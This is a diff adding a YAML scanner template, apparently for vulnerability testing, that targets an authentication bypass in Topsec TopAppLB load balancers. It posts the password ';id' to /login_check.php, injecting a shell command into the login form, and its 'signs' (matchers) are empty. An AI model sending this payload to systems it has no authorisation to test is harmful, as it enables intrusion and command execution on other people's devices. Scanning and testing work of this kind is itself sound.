@@ -1,0 +1,23 @@
+id: topsec-topapplb-auth-bypass
+brief:
+    title: Topsec TopAppLB - Authentication Bypass
+    by: SleepingBag945
+    level: high
+    about: Topsec TopAppLB is vulnerable to authetication bypass .Enter any account on the login page, the password is `;id`.
+    label:
+        - topsec
+        - topapplb
+        - auth-bypass
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/login_check.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: userName=admin&password=%3Bid
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
